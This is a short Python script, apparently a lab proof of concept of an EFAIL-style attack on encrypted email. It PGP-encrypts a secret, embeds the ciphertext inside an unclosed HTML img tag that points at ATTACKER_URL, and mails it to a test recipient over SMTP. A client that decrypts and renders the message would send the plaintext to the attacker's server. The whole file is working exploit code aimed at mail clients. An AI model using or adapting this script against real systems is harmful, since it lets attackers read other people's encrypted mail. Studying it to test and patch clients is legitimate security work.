#!/usr/bin/env python3

ATTACKER_URL = "http://192.168.56.1:8000"

from smtplib import SMTP
from email.message import EmailMessage
from email.utils import formatdate
from pgpy import PGPMessage, PGPKey

def main():
    plaintext = PGPMessage.new(b"Your secret code is: correct-horse-battery-staple")
    pk, _ = PGPKey.from_file("pgp1@single.test.asc")
    pgpmsg = pk.encrypt(plaintext)

    email_msg = EmailMessage()
    email_msg.set_content(f"<img src='{ATTACKER_URL}/\n{str(pgpmsg)}'>")
    email_msg["Subject"] = "Secret Code"
    email_msg["From"] = "foo@tmp.test"
    email_msg["To"] = "pgp1@single.test"
    email_msg["Date"] = formatdate(localtime=True)
    email_msg["X-Effective-Content-Type"] = "text/html"

    with SMTP("192.168.56.101") as smtp:
        smtp.ehlo_or_helo_if_needed()
        smtp.send_message(email_msg)
        smtp.quit()


if __name__ == "__main__":
    main()
